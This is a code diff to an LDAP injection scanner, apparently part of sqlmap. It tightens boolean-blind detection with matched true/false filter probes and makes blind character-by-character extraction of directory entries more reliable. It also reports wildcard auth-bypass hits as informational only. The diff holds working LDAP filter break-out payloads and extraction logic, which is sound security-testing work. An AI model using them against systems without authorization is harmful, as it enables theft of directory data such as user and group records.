@@ -5,7 +5,6 @@ Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
-import difflib
 import re
 import time
 
@@ -18,6 +17,14 @@ from lib.core.data import conf
 from lib.core.data import logger
 from lib.core.enums import CUSTOM_LOGGING
 from lib.core.enums import PLACE
+from lib.utils.nonsql import InconclusiveError
+from lib.utils.nonsql import INCONCLUSIVE_MARK
+from lib.utils.nonsql import userDecision
+from lib.utils.nonsql import resolveBit
+from lib.utils.nonsql import sqlErrorPresent
+from lib.utils.nonsql import blockedStatus
+from lib.utils.nonsql import ratio as _ratio
+from lib.utils.nonsql import userOracleActive
 from lib.core.settings import LDAP_CHAR_MAX
 from lib.core.settings import LDAP_CHAR_MIN
 from lib.core.settings import LDAP_ERROR_REGEX
@@ -31,6 +38,7 @@ from lib.utils.xrange import xrange
 
 
 SENTINEL = randomStr(length=10, lowercase=True)
+
 
 # _send() below currently knows how to rebuild GET and POST-style parameter
 # strings. Cookie and URI delivery require separate per-place logic and should not
@@ -104,8 +112,6 @@ Slot = namedtuple("Slot", ("place", "parameter", "backend", "oracle", "template"
 Slot.__new__.__defaults__ = (None, None, None, None, None, None, None, None)
 
 
-def _ratio(first, second):
-    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()
 
 
 def _delim(place):
@@ -162,17 +168,27 @@ def _send(place, parameter, value):
 
         if conf.verbose >= 3:
             logger.log(CUSTOM_LOGGING.PAYLOAD, payload)
-        page, _, _ = Request.getPage(**kwargs)
+        page, _, code = Request.getPage(**kwargs)
+        # a transport failure or a BLOCKED/ERROR status (5xx, 403/429 WAF/rate-limit) is not a usable
+        # oracle sample - signal None so `_boolean`/`extract` (which reject None) can't decide on it
+        if blockedStatus(code):
+            return None
         return page or ""
     except Exception as ex:
         logger.debug("LDAP probe request failed: %s" % getUnicode(ex))
-        return ""
+        return None
     finally:
         conf.skipUrlEncode = skipUrlEncode
 
 
 def _isError(page):
-    return bool(re.search(LDAP_ERROR_REGEX, getUnicode(page or "")))
+    # an LDAP error body OR a recognized SQL/DBMS error marks a response as NOT a valid boolean
+    # template. The SQL/DBMS check (reusing sqlmap's errors.xml via htmlParser + the generic
+    # `SQL (warning|error|syntax)` marker) is essential: an LDAP filter break-out like `1)(uid=*`
+    # trips a DBMS SYNTAX ERROR on a SQL-injectable parameter, and that error page merely differs
+    # from a normal page - which would otherwise fake a boolean oracle and misreport SQLi as LDAP.
+    page = getUnicode(page or "")
+    return bool(re.search(LDAP_ERROR_REGEX, page)) or sqlErrorPresent(page)
 
 
 def _backendFromError(page):
@@ -180,7 +196,9 @@ def _backendFromError(page):
     for backend, regex in LDAP_ERROR_SIGNATURES:
         if re.search(regex, page):
             return backend
-    return "Generic LDAP" if _isError(page) else None
+    # ONLY a genuine LDAP error names a (generic) LDAP back-end - never a SQL/DBMS error (which
+    # _isError() also flags, so it can reject a faked oracle, but which must NOT be attributed to LDAP)
+    return "Generic LDAP" if re.search(LDAP_ERROR_REGEX, page) else None
 
 
 def _probeBackendByParserError(place, parameter):
@@ -219,7 +237,16 @@ def _boolean(truthy, falsy):
         return None
 
     truePage2 = truthy()
-    if _ratio(truePage, truePage2) >= UPPER_RATIO_BOUND and _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:
+    if _ratio(truePage, truePage2) < UPPER_RATIO_BOUND:     # the TRUE side must independently reproduce
+        return None
+    if _ratio(falsePage, falsy()) < UPPER_RATIO_BOUND:      # the FALSE side must independently reproduce too
+        return None
+
+    # honor an explicit user oracle (--string/--not-string/--regexp) over raw similarity
+    if userOracleActive():
+        return truePage if (userDecision(truePage) is True and userDecision(falsePage) is False) else None
+
+    if _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:     # ... and true must differ from false
         return truePage
 
     return None
@@ -229,24 +256,25 @@ def _detectBoolean(place, parameter):
     """Return (template, payload, breakout) for boolean-blind LDAPi."""
 
     original = _originalValue(place, parameter) or ""
-    falsePayload = original + SENTINEL
 
     for breakout in LDAP_BREAKOUT_PREFIXES:
         for attr in LDAP_TAUTOLOGY_ATTRIBUTES:
-            # Open fragment by design. The application template supplies the tail.
+            # MATCHED controls: true and false share the SAME breakout, the SAME attribute and the
+            # SAME open-fragment shape - only the assertion's truth changes. `(attr=*` matches every
+            # directory entry; `(attr=<sentinel>` matches none. A diverging pair proves the value is
+            # parsed as an LDAP FILTER (the `)(...` escaped the surrounding filter), which a plain
+            # string search cannot reproduce. The old false control was a bare `original+SENTINEL`
+            # (an UNMATCHED ordinary string), so a validation layer or wildcard search could diverge
+            # for reasons unrelated to filter injection - a false positive.
             truePayload = "%s%s(%s=*" % (original, breakout, attr)
+            falsePayload = "%s%s(%s=%s" % (original, breakout, attr, SENTINEL)
             template = _boolean(lambda p=truePayload: _send(place, parameter, p),
                                 lambda p=falsePayload: _send(place, parameter, p))
             if template:
                 return template, truePayload, breakout
 
-    # Useful for auth/search bypass reporting, but not enough to synthesize
-    # arbitrary LDAP filters for enumeration.
-    if original:
-        template = _boolean(lambda: _send(place, parameter, "*"),
-                            lambda: _send(place, parameter, SENTINEL))
-        if template:
-            return template, "*", None
+    # NOTE: no bare `*`-vs-sentinel fallback. A wildcard returning more records is normal search
+    # behavior, not proof of an LDAP filter-boundary escape, and carries no breakout for extraction.
 
     return None, None, None
 
@@ -377,44 +405,78 @@ class _ProbeBuilder(object):
         return self.raw("%s(objectClass=%s*" % (compound, SENTINEL))
 
 
-def _makeOracle(place, parameter, template):
+def _makeOracle(place, parameter, breakout):
+    """Build the extraction oracle by RECALIBRATING its true/false models on the SAME base + winning
+    breakout the extraction payloads use - the `_ProbeBuilder` leads every probe with SENTINEL, so
+    the models must too. A matched always-true filter `SENTINEL<breakout>(objectClass=*` (objectClass
+    is on every entry) and a matched always-FALSE `SENTINEL<breakout>(objectClass=<sentinel>` (no
+    entry has it) - same shape, only the assertion's truth changed. The old oracle compared SENTINEL-
+    based extraction payloads against an ORIGINAL-based detection template and a bare unreproduced
+    SENTINEL false page - a base/shape mismatch. Reproduce both, require separable, else None."""
+
     cache = {}
 
     def request(payload):
+        # cache ONLY usable responses - a cached transient failure would freeze a wrong bit forever
         if payload not in cache:
-            cache[payload] = _send(place, parameter, payload)
+            page = _send(place, parameter, payload)
+            if page and not _isError(page):
+                cache[payload] = page
+            return page
         return cache[payload]
 
-    falsePage = request(SENTINEL)
+    builder = _ProbeBuilder(breakout)
+    truePayload = builder.raw("(objectClass=*")
+    falsePayload = builder.raw("(objectClass=%s" % SENTINEL)
+    trueModel = request(truePayload)
+    falseModel = request(falsePayload)
 
-    def oracle(payload):
-        page = request(payload)
-        if not page or _isError(page):
-            return False
-        return _ratio(template, page) >= UPPER_RATIO_BOUND
+    if trueModel is None or falseModel is None or _isError(trueModel) or _isError(falseModel):
+        return None
+    if _ratio(trueModel, _send(place, parameter, truePayload)) < UPPER_RATIO_BOUND:      # reproduce true
+        return None
+    if _ratio(falseModel, _send(place, parameter, falsePayload)) < UPPER_RATIO_BOUND:    # reproduce false
+        return None
+    if _ratio(trueModel, falseModel) >= UPPER_RATIO_BOUND:      # not separable -> can't extract reliably
+        return None
 
     def extract(payload):
+        # a positive bit (attribute-prefix match) must lean CLEARLY toward the recalibrated TRUE
+        # model over the matched FALSE model (shared 3-way classifier) - NOT merely "different from
+        # a bare sentinel page", which read a dynamic token / WAF body / transient exception as a
+        # match and fabricated LDAP values one character at a time. A transport failure / error is
+        # UNKNOWN (routed through resolveBit -> retry -> InconclusiveError), never a pre-decided False.
         page = request(payload)
-        if not page or _isError(page):
-            return False
-        return _ratio(falsePage, page) < UPPER_RATIO_BOUND
+        usable = page if (page and not _isError(page)) else None
+
+        def fresh():
+            p = _send(place, parameter, payload)
+            return None if (not p or _isError(p)) else p
+        return resolveBit(usable, trueModel, falseModel, fresh)
+
+    def oracle(payload):
+        return extract(payload)
 
     oracle.extract = extract
-    oracle.template = template
-    oracle.falsePage = falsePage
+    oracle.template = trueModel
+    oracle.falsePage = falseModel
     oracle.cache = cache
     return oracle
 
 
 # Avoid LDAP metacharacters in blind character extraction. In real LDAP they can
 # be escaped, but many simple test harnesses decode them before wildcard handling,
-# producing false positives. Transport-sensitive chars are allowed because
-# _ldapLiteral() encodes them.
-_META_ORDS = set(ord(_) for _ in ('*', '(', ')', '\\'))
+# The filter metacharacters *, (, ), \ are INCLUDED in the extraction charset: `_ldapLiteral()` escapes
+# each one (*->\2a, (->\28, )->\29, \->\5c) in the prefix probe, so they are matched as LITERAL bytes
+# (no wildcard / no false positive) and a value like `CN=Smith\, John (Admin)` or `abc*def` is recovered
+# in full instead of being truncated at the first metacharacter. They sit at the FREQUENCY TAIL (rare in
+# real data), so common characters are still tried first.
+_META_ORDS = set()
 _FREQ = (tuple(xrange(ord('a'), ord('z') + 1)) +
          tuple(xrange(ord('A'), ord('Z') + 1)) +
          tuple(xrange(ord('0'), ord('9') + 1)) +
-         tuple(ord(_) for _ in "@._-+ "))
+         tuple(ord(_) for _ in "@._-+ ") +
+         tuple(ord(_) for _ in "*()\\"))            # filter metacharacters (escaped by _ldapLiteral)
 _CHARSET = []
 for _ in _FREQ:
     if LDAP_CHAR_MIN <= _ <= LDAP_CHAR_MAX and _ not in _META_ORDS and _ not in _CHARSET:
@@ -428,33 +490,41 @@ def _exists(oracle, builder, attr, constraint=None, exclusions=None):
     return oracle.extract(builder.presence(attr, constraint=constraint, exclusions=exclusions))
 
 
-def _inferAttribute(oracle, builder, attr, constraint=None, exclusions=None, maxLen=LDAP_MAX_LENGTH):
+def _inferAttribute(oracle, builder, attr, constraint=None, exclusions=None, maxLen=LDAP_MAX_LENGTH, strict=False):
     value = ""
     probes = 0
 
-    for _ in xrange(maxLen):
-        found = False
+    try:
+        for _ in xrange(maxLen):
+            found = False
 
-        for cp in _CHARSET:
-            candidate = value + chr(cp)
-            probes += 1
+            for cp in _CHARSET:
+                candidate = value + chr(cp)
+                probes += 1
 
-            if oracle.extract(builder.prefix(attr, candidate, constraint=constraint, exclusions=exclusions)):
-                value = candidate
-                found = True
+                if oracle.extract(builder.prefix(attr, candidate, constraint=constraint, exclusions=exclusions)):
+                    value = candidate
+                    found = True
+                    break
+
+            if not found:
                 break
 
-        if not found:
-            break
-
-        # Three or more consecutive trailing spaces never occur in real
-        # directory data.  When the server-side LDAP-to-SQL translation
-        # (or equivalent) spuriously matches a trailing-space probe (e.g.
-        # mail=user@dom * matching user@dom), the extraction would
-        # otherwise chase an endless phantom suffix.  Terminate and strip.
-        if value.endswith("   "):
-            value = value.rstrip()
-            break
+            # Three or more consecutive trailing spaces never occur in real
+            # directory data.  When the server-side LDAP-to-SQL translation
+            # (or equivalent) spuriously matches a trailing-space probe (e.g.
+            # mail=user@dom * matching user@dom), the extraction would
+            # otherwise chase an endless phantom suffix.  Terminate and strip.
+            if value.endswith("   "):
+                value = value.rstrip()
+                break
+    except InconclusiveError:
+        # a structural caller (entry-key enumeration) must SEE the abort to mark the dump partial - it
+        # is NOT end-of-data; a per-value caller instead gets None and renders an inconclusive marker
+        if strict:
+            raise
+        logger.warning("LDAP extraction aborted for attribute '%s' (oracle inconclusive after retries)" % attr)
+        return None
 
     logger.debug("LDAP blind inference: %d probes for attribute '%s' (length=%d)" % (probes, attr, len(value)))
     return value if value else None
@@ -538,15 +608,24 @@ def _probeRootDSE(oracle, builder):
 
 def _enumerateEntryKeys(oracle, builder):
     for keyAttr in ENTRY_KEY_ATTRIBUTES:
-        if not _exists(oracle, builder, keyAttr):
-            continue
+        try:
+            if not _exists(oracle, builder, keyAttr):
+                continue
+        except InconclusiveError:
+            continue                                    # existence unknown for this key attr -> try next
 
-        values = []
+        values, partial = [], False
         while len(values) < LDAP_MAX_RECORDS:
             exclusions = [(keyAttr, _) for _ in values]
-            value = _inferAttribute(oracle, builder, keyAttr, exclusions=exclusions)
+            try:
+                # strict: an inconclusive NEXT-entry key probe is UNKNOWN, not the end of the directory
+                value = _inferAttribute(oracle, builder, keyAttr, exclusions=exclusions, strict=True)
+            except InconclusiveError:
+                partial = True
+                logger.warning("directory entry enumeration became inconclusive after %d entr%s; the dump is PARTIAL" % (len(values), "y" if len(values) == 1 else "ies"))
+                break
 
-            if not value or value in values:
+            if not value or value in values:            # "" / repeat -> genuine end
                 break
 
             values.append(value)
@@ -555,13 +634,14 @@ def _enumerateEntryKeys(oracle, builder):
         if values:
             if len(values) >= LDAP_MAX_RECORDS:
                 logger.warning("directory enumeration hit the LDAP_MAX_RECORDS (%d) cap; some entries may be omitted" % LDAP_MAX_RECORDS)
-            return keyAttr, values
+                partial = True                          # a truncated cap is NOT a complete dump
+            return keyAttr, values, partial
 
-    return None, []
+    return None, [], False
 
 
 def _dumpEntries(oracle, builder, place, parameter):
-    keyAttr, keys = _enumerateEntryKeys(oracle, builder)
+    keyAttr, keys, partial = _enumerateEntryKeys(oracle, builder)
     if not keys:
         logger.warning("could not identify a stable directory entry key")
         return False
@@ -579,21 +659,25 @@ def _dumpEntries(oracle, builder, place, parameter):
                 continue
 
             logger.info("probing attribute '%s'" % attr)
-            if not _exists(oracle, builder, attr, constraint=constraint):
-                continue
-
+            try:
+                if not _exists(oracle, builder, attr, constraint=constraint):
+                    continue
+            except InconclusiveError:
+                continue                                # existence unknown -> skip this attribute
+            # an attribute confirmed to exist but whose value is inconclusive must show the marker, NOT
+            # be silently omitted (which would read as "attribute absent")
             value = _inferAttribute(oracle, builder, attr, constraint=constraint)
-            if value:
-                row[attr] = value
-                discovered.add(attr)
+            row[attr] = INCONCLUSIVE_MARK if value is None else value
+            discovered.add(attr)
 
         rows.append(row)
 
     columns = [keyAttr] + [_ for _ in DUMP_ATTRIBUTES if _ != keyAttr and _ in discovered]
     tableRows = [tuple(row.get(column, "") for column in columns) for row in rows]
 
-    logger.info("dumped %d entr%s" % (len(rows), "y" if len(rows) == 1 else "ies"))
-    _dumpTable("LDAP: %s parameter '%s' directory entries" % (place, parameter), columns, tableRows)
+    completeness = " (PARTIAL - entry enumeration aborted, oracle inconclusive)" if partial else ""
+    logger.info("dumped %d entr%s%s" % (len(rows), "y" if len(rows) == 1 else "ies", completeness))
+    _dumpTable("LDAP: %s parameter '%s' directory entries%s" % (place, parameter, completeness), columns, tableRows)
     return True
 
 
@@ -604,22 +688,20 @@ def _dumpMultiValues(oracle, builder, place, parameter):
         if not _exists(oracle, builder, attr):
             continue
 
-        # Multi-valued attributes (member, memberOf, ...) carry several values;
-        # walk them by excluding each recovered value from the next probe, exactly
-        # like _enumerateEntryKeys does for entry keys.
-        values = []
-        while len(values) < LDAP_MAX_RECORDS:
-            exclusions = [(attr, _) for _ in values]
-            value = _inferAttribute(oracle, builder, attr, exclusions=exclusions)
-            if not value or value in values:
-                break
-            values.append(value)
-
-        if values:
-            if len(values) >= LDAP_MAX_RECORDS:
-                logger.warning("attribute '%s' hit the LDAP_MAX_RECORDS (%d) cap; some values may be omitted" % (attr, LDAP_MAX_RECORDS))
-            logger.info("fetched %d value%s from attribute '%s'" % (len(values), "" if len(values) == 1 else "s", attr))
-            _dumpTable("LDAP: %s parameter '%s' '%s' values" % (place, parameter, attr), [attr], [(_,) for _ in values])
+        # Multi-valued attributes (member, memberOf, uniqueMember) can hold several values in ONE entry.
+        # LDAP filters are ENTRY-scoped, so the intuitive "exclude each recovered value to get the next"
+        # walk is WRONG: (!(member=A)) excludes the whole ENTRY that holds member=A, so a second value of
+        # the SAME entry can never surface, and the probe may instead match a DIFFERENT entry that also
+        # carries the attribute - silently mixing entries while claiming a complete multi-value dump.
+        # Recovering one value per attribute and labelling it honestly is correct; true per-value
+        # enumeration needs a unique-entry binding or AD ranged retrieval (member;range=0-*), not
+        # negation. Report the single recovered value as exactly that.
+        value = _inferAttribute(oracle, builder, attr)
+        if value:
+            logger.info("recovered one matching value of multi-valued attribute '%s' "
+                        "(full per-value enumeration is not proven over entry-scoped LDAP filters)" % attr)
+            _dumpTable("LDAP: %s parameter '%s' '%s' (one matching value, NOT full multi-value enumeration)" % (place, parameter, attr),
+                       [attr], [(value,)])
             dumped = True
 
     return dumped
@@ -686,22 +768,28 @@ def ldapScan():
             if template and breakout:
                 found += 1
                 backend = backendHint or None
-                logger.info("%s parameter '%s' is vulnerable to LDAP injection (back-end: '%s')" % (place, parameter, backend or "Generic"))
                 if conf.beep:
                     beep()
 
-                oracle = _makeOracle(place, parameter, template)
-                slots.append(Slot(place=place, parameter=parameter, backend=backend, oracle=oracle, template=template, payload=payload, breakout=breakout))
+                oracle = _makeOracle(place, parameter, breakout)
+                if oracle is None:
+                    # detection confirmed, but the extraction true/false models are not reliably
+                    # separable -> report the finding WITHOUT dumping (never fabricate directory data)
+                    logger.info("%s parameter '%s' is vulnerable to LDAP injection (back-end: '%s'); "
+                                "extraction disabled (true/false models not reliably separable)" % (place, parameter, backend or "Generic"))
+                    conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: LDAP injection\n    Title: LDAP boolean-based blind (extraction unavailable)\n    Payload: %s\n---" % (parameter, place, payload))
+                    continue
+                logger.info("%s parameter '%s' is vulnerable to LDAP injection (back-end: '%s')" % (place, parameter, backend or "Generic"))
+                slots.append(Slot(place=place, parameter=parameter, backend=backend, oracle=oracle, template=oracle.template, payload=payload, breakout=breakout))
                 continue
 
-            # Phase 3: wildcard auth bypass (credential fields only).
+            # Phase 3: wildcard behavior on a credential field. A `*`-vs-random response difference is
+            # NOT a confirmed authentication bypass: it proves neither a query-boundary escape nor an
+            # authenticated-state transition (no redirect / session cookie / success-marker check here).
+            # Report it as INFORMATIONAL only - a confirmed bypass needs a real authenticated-state proof.
             bypass = _detectAuthBypass(place, parameter)
             if bypass:
-                found += 1
-                logger.info("%s parameter '%s' allows LDAP wildcard auth bypass (password=*)" % (place, parameter))
-                if conf.beep:
-                    beep()
-                slots.append(Slot(place=place, parameter=parameter, bypass=bypass))
+                logger.info("%s parameter '%s': wildcard '*' changes the response (possible LDAP filter influence / auth-bypass surface) - INFORMATIONAL, not a confirmed injection (no authenticated-state transition verified)" % (place, parameter))
                 continue
 
             # Parser-error alone is not exploitable -- log it but do not
